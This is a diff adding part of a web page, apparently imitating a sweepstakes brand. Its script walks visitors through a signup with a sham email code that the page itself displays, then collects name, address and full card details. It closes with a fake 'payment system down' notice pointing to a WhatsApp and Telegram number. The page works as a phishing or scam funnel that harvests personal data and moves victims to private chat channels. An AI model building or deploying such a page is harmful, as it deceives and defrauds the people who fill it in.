+      <p>We do not sell your personal data. We may share information with trusted service providers (shipping, payment processing) solely to operate our services.</p>
+      <h3>Your Rights</h3>
+      <p>You may request access, correction, or deletion of your personal data at any time by contacting our support team.</p>
+    </div>
+    <div class="modal-footer"><button onclick="closeModal('ppModal')">Close</button></div>
+  </div>
+</div>
+
+<script>
+  var generatedCode = '';
+
+  /* ── Step navigation ── */
+  function showStep(id) {
+    ['step-email','step-otp','step-profile','step-payment','step-success'].forEach(function(s) {
+      var el = document.getElementById(s);
+      if (el) el.style.display = 'none';
+    });
+    document.getElementById(id).style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function goBack(stepId) { showStep(stepId); }
+
+  /* ── STEP 1: Email ── */
+  function showUnavailable() {
+    var t = document.getElementById('unavailableToast');
+    t.classList.remove('hide');
+    clearTimeout(window._toastTimer);
+    window._toastTimer = setTimeout(function() { t.classList.add('hide'); }, 4000);
+  }
+
+  function handleContinue() {
+    var email = document.getElementById('emailInput').value.trim();
+    var errEl = document.getElementById('emailError');
+    var inp   = document.getElementById('emailInput');
+    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      errEl.classList.add('show');
+      inp.classList.add('error');
+      return;
+    }
+    errEl.classList.remove('show');
+    inp.classList.remove('error');
+    generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+    document.getElementById('emailDisplay').textContent = email;
+    document.getElementById('codeHint').textContent = generatedCode;
+    showStep('step-otp');
+    clearOtpBoxes();
+    setTimeout(function() { document.getElementById('o1').focus(); }, 120);
+  }
+
+  /* ── STEP 2: OTP ── */
+  function verifyOtp() {
+    var boxes   = ['o1','o2','o3','o4','o5','o6'];
+    var entered = boxes.map(function(id) { return document.getElementById(id).value; }).join('');
+    var errEl   = document.getElementById('otpError');
+    if (entered.length < 6) {
+      errEl.textContent = 'Please enter the complete 6-digit code.';
+      errEl.classList.add('show');
+      boxes.forEach(function(id) { document.getElementById(id).classList.add('error-box'); });
+      return;
+    }
+    if (entered !== generatedCode) {
+      errEl.textContent = 'Incorrect code. Please check and try again.';
+      errEl.classList.add('show');
+      boxes.forEach(function(id) { var el = document.getElementById(id); el.classList.add('error-box'); el.value = ''; });
+      document.getElementById('o1').focus();
+      return;
+    }
+    errEl.classList.remove('show');
+    showStep('step-profile');
+  }
+
+  function resendCode() {
+    generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+    document.getElementById('codeHint').textContent = generatedCode;
+    clearOtpBoxes();
+    document.getElementById('otpError').classList.remove('show');
+    var link = document.getElementById('resendLink');
+    link.textContent = 'Sent!';
+    link.style.color = '#16a34a';
+    setTimeout(function() { link.textContent = 'Resend'; link.style.color = 'var(--blue)'; }, 2500);
+  }
+
+  function clearOtpBoxes() {
+    ['o1','o2','o3','o4','o5','o6'].forEach(function(id) {
+      var el = document.getElementById(id);
+      el.value = '';
+      el.classList.remove('error-box','filled');
+    });
+  }
+
+  /* OTP box keyboard behavior */
+  document.addEventListener('DOMContentLoaded', function() {
+    var boxes = ['o1','o2','o3','o4','o5','o6'];
+    boxes.forEach(function(id, idx) {
+      var el = document.getElementById(id);
+      el.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g,'');
+        if (this.value) {
+          this.classList.add('filled'); this.classList.remove('error-box');
+          if (idx < boxes.length - 1) document.getElementById(boxes[idx+1]).focus();
+          var all = boxes.every(function(bid) { return document.getElementById(bid).value !== ''; });
+          if (all) setTimeout(verifyOtp, 250);
+        } else {
+          this.classList.remove('filled');
+        }
+      });
+      el.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && idx > 0) document.getElementById(boxes[idx-1]).focus();
+      });
+      el.addEventListener('paste', function(e) {
+        e.preventDefault();
+        var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g,'').slice(0,6);
+        pasted.split('').forEach(function(ch, i) {
+          if (i < boxes.length) { var b = document.getElementById(boxes[i]); b.value = ch; b.classList.add('filled'); }
+        });
+        document.getElementById(boxes[Math.min(pasted.length, boxes.length-1)]).focus();
+        if (pasted.length === 6) setTimeout(verifyOtp, 250);
+      });
+    });
+  });
+
+  /* ── STEP 3: Profile ── */
+  function req(id, errId, test) {
+    var val = document.getElementById(id).value.trim();
+    var errEl = document.getElementById(errId);
+    var pass = test ? test(val) : val.length > 0;
+    document.getElementById(id).classList.toggle('error', !pass);
+    if (errEl) errEl.classList.toggle('show', !pass);
+    return pass;
+  }
+
+  function submitProfile() {
+    var ok = true;
+    ok = req('firstName','firstNameError') && ok;
+    ok = req('lastName','lastNameError') && ok;
+    ok = req('address1','address1Error') && ok;
+    ok = req('city','cityError') && ok;
+    ok = req('state','stateError', function(v){ return v.length > 0; }) && ok;
+    ok = req('zipCode','zipError', function(v){ return /^\d{5}(-\d{4})?$/.test(v); }) && ok;
+    if (!ok) return;
+    showStep('step-payment');
+  }
+
+  /* ── STEP 4: Payment ── */
+  function formatCard(input) {
+    var raw = input.value.replace(/\D/g,'').slice(0,16);
+    input.value = raw.match(/.{1,4}/g) ? raw.match(/.{1,4}/g).join(' ') : raw;
+    var badge = document.getElementById('cardTypeBadge');
+    var type = '';
+    if (/^4/.test(raw)) type = 'VISA';
+    else if (/^5[1-5]/.test(raw)) type = 'MC';
+    else if (/^3[47]/.test(raw)) type = 'AMEX';
+    else if (/^6011/.test(raw)) type = 'DISC';
+    if (type) { badge.textContent = type; badge.style.display = 'block'; }
+    else { badge.style.display = 'none'; }
+  }
+
+  function formatExpiry(input) {
+    var raw = input.value.replace(/\D/g,'').slice(0,4);
+    if (raw.length >= 3) input.value = raw.slice(0,2) + ' / ' + raw.slice(2);
+    else if (raw.length === 2) input.value = raw + ' / ';
+    else input.value = raw;
+  }
+
+  function toggleBillingAddress(cb) {
+    document.getElementById('billingAddressFields').style.display = cb.checked ? 'none' : 'block';
+  }
+
+  function submitPayment() {
+    var ok = true;
+    ok = req('cardName','cardNameError') && ok;
+    var cardRaw = document.getElementById('cardNumber').value.replace(/\D/g,'');
+    if (cardRaw.length < 15) {
+      document.getElementById('cardNumber').classList.add('error');
+      document.getElementById('cardNumberError').classList.add('show');
+      ok = false;
+    } else {
+      document.getElementById('cardNumber').classList.remove('error');
+      document.getElementById('cardNumberError').classList.remove('show');
+    }
+    var expiry = document.getElementById('cardExpiry').value.replace(/\s/g,'');
+    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+      document.getElementById('cardExpiry').classList.add('error');
+      document.getElementById('cardExpiryError').classList.add('show');
+      ok = false;
+    } else {
+      document.getElementById('cardExpiry').classList.remove('error');
+      document.getElementById('cardExpiryError').classList.remove('show');
+    }
+    var cvv = document.getElementById('cardCvv').value.trim();
+    if (!/^\d{3,4}$/.test(cvv)) {
+      document.getElementById('cardCvv').classList.add('error');
+      document.getElementById('cardCvvError').classList.add('show');
+      ok = false;
+    } else {
+      document.getElementById('cardCvv').classList.remove('error');
+      document.getElementById('cardCvvError').classList.remove('show');
+    }
+    if (!ok) return;
+
+    // Save user session to localStorage (no card data stored)
+    var userData = {
+      email: document.getElementById('emailInput').value.trim(),
+      firstName: document.getElementById('firstName').value.trim(),
+      lastName: document.getElementById('lastName').value.trim(),
+      address: document.getElementById('address1').value.trim(),
+      city: document.getElementById('city').value.trim(),
+      state: document.getElementById('state').value,
+      zip: document.getElementById('zipCode').value.trim(),
+      loggedIn: true,
+      bonusEntries: 500
+    };
+    localStorage.setItem('pch_user', JSON.stringify(userData));
+
+    // Show payment down notice before going to success
+    document.getElementById('paymentDownLoginModal').classList.add('open');
+  }
+
+  function continueAfterPaymentNotice() {
+    document.getElementById('paymentDownLoginModal').classList.remove('open');
+    document.getElementById('welcomeEntries').textContent = '500 Bonus Entries';
+    showStep('step-success');
+  }
+
+  /* ── Modals ── */
+  function openModal(id)  { document.getElementById(id).classList.add('open'); }
+  function closeModal(id) { document.getElementById(id).classList.remove('open'); }
+  function handleOverlay(e, id) { if (e.target === document.getElementById(id)) closeModal(id); }
+
+  /* ── Phone formatter ── */
+  document.addEventListener('DOMContentLoaded', function() {
+    var ph = document.getElementById('phone');
+    if (ph) ph.addEventListener('input', function() {
+      var raw = this.value.replace(/\D/g,'').slice(0,10);
+      if (raw.length >= 7) this.value = '(' + raw.slice(0,3) + ') ' + raw.slice(3,6) + '-' + raw.slice(6);
+      else if (raw.length >= 4) this.value = '(' + raw.slice(0,3) + ') ' + raw.slice(3);
+      else if (raw.length > 0) this.value = '(' + raw;
+    });
+  });
+</script>
+
+<style>
+.pch-modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.72);z-index:99999;align-items:center;justify-content:center;padding:16px;backdrop-filter:blur(6px);}
+.pch-modal-overlay.open{display:flex;animation:fdIn .25s ease;}
+@keyframes fdIn{from{opacity:0}to{opacity:1}}
+.pd-login-box{background:#fff;border-radius:20px;width:100%;max-width:440px;box-shadow:0 40px 100px rgba(0,0,0,.5);overflow:hidden;animation:suUp .35s cubic-bezier(.34,1.56,.64,1);}
+@keyframes suUp{from{opacity:0;transform:translateY(30px) scale(.95)}to{opacity:1;transform:none}}
+.pdl-hdr{background:linear-gradient(135deg,#b45309,#92400e);padding:28px;text-align:center;}
+.pdl-hdr .pdl-icon{font-size:52px;margin-bottom:10px;}
+.pdl-hdr h2{font-family:"Barlow Condensed",sans-serif;font-size:24px;font-weight:900;color:#fff;text-transform:uppercase;line-height:1.2;}
+.pdl-body{padding:26px;}
+.pdl-body p{font-size:14px;color:#374151;line-height:1.7;margin-bottom:16px;text-align:center;}
+.pdl-note{background:#fef3c7;border:1px solid #fcd34d;border-radius:10px;padding:14px 16px;font-size:13px;color:#92400e;margin-bottom:18px;font-weight:600;line-height:1.55;}
+.pdl-channels{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px;}
+.ch-b{display:flex;align-items:center;gap:10px;padding:13px 14px;border-radius:12px;border:none;cursor:pointer;font-weight:700;font-size:13px;text-decoration:none;transition:transform .15s,box-shadow .15s;}
+.ch-b:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,0,0,.15);}
+.ch-b.wa{background:#25D366;color:#fff;}
+.ch-b.tg{background:#229ED9;color:#fff;}
+.ch-b .chi{font-size:22px;}
+.ch-b .chtt{font-size:12px;font-weight:800;text-transform:uppercase;letter-spacing:.04em;}
+.ch-b .chts{font-size:11px;opacity:.8;}
+.btn-continue-pdl{width:100%;background:#002147;color:#fff;font-weight:800;font-size:15px;padding:14px;border-radius:10px;border:none;cursor:pointer;font-family:"Barlow",sans-serif;text-transform:uppercase;letter-spacing:.06em;transition:background .2s;}
+.btn-continue-pdl:hover{background:#003580;}
+</style>
+
+<div class="pch-modal-overlay" id="paymentDownLoginModal">
+  <div class="pd-login-box">
+    <div class="pdl-hdr">
+      <div class="pdl-icon">🔧</div>
+      <h2>Online Payment Temporarily Unavailable</h2>
+    </div>
+    <div class="pdl-body">
+      <p>Our online payment system is currently undergoing scheduled maintenance to enhance security for all transactions.</p>
+      <div class="pdl-note">
+        💡 <strong>Your account has been created successfully!</strong><br>
+        To complete any purchase or membership payment, please contact our support team directly. We're available <strong>24 hours a day</strong>.
+      </div>
+      <div class="pdl-channels">
+        <a class="ch-b wa" href="https://wa.me/12513845775" target="_blank">
+          <span class="chi">💬</span>
+          <div><div class="chtt">WhatsApp</div><div class="chts">12513845775</div></div>
+        </a>
+        <a class="ch-b tg" href="https://t.me/12513845775" target="_blank">
+          <span class="chi">✈️</span>
+          <div><div class="chtt">Telegram</div><div class="chts">12513845775</div></div>
+        </a>
+      </div>
+      <button class="btn-continue-pdl" onclick="continueAfterPaymentNotice()">✅ Got It — Continue to My Account</button>
+    </div>
+  </div>
+</div>
+</body>
+</html>
